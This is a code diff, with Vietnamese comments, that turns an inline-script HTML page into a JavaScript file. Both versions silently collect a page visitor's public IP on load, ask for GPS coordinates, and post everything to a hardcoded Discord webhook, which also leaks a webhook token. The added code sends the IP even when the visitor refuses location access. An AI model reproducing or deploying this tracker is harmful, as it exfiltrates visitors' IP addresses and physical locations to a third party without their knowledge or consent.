@@ -1,38 +1,31 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // Hàm lấy vị trí và gửi lên Discord
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData);
-            }
+async function sendToDiscord(data) {
+    const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
+    await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: data })
+    });
+}
+
+// 1. Luôn lấy IP khi load trang
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ip = data.ip;
+        
+        // 2. Kiểm tra GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Nếu đồng ý: Gửi cả IP và GPS
+                    sendToDiscord(`📍 **Truy cập:**\nIP: ${ip}\nLat: ${position.coords.latitude}\nLong: ${position.coords.longitude}`);
+                },
+                () => {
+                    // Nếu từ chối: Chỉ gửi IP
+                    sendToDiscord(`📍 **Truy cập (Từ chối GPS):**\nIP: ${ip}`);
+                }
+            );
+        } else {
+            sendToDiscord(`📍 **Truy cập (Không hỗ trợ GPS):**\nIP: ${ip}`);
         }
-
-        async function sendData(position) {
-            const lat = position.coords.latitude;
-            const long = position.coords.longitude;
-            const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
-
-            // 1. Lấy địa chỉ IP thông qua API miễn phí
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-
-            // 2. Gửi dữ liệu lên Discord
-            const message = {
-                content: `📍 **Thông tin truy cập:**\nIP: ${ip}\nLat: ${lat}\nLong: ${long}`
-            };
-
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            });
-        }
-
-        // Tự động chạy khi tải trang
-        getLocation();
-    </script>
-</body>
-</html>
+    });
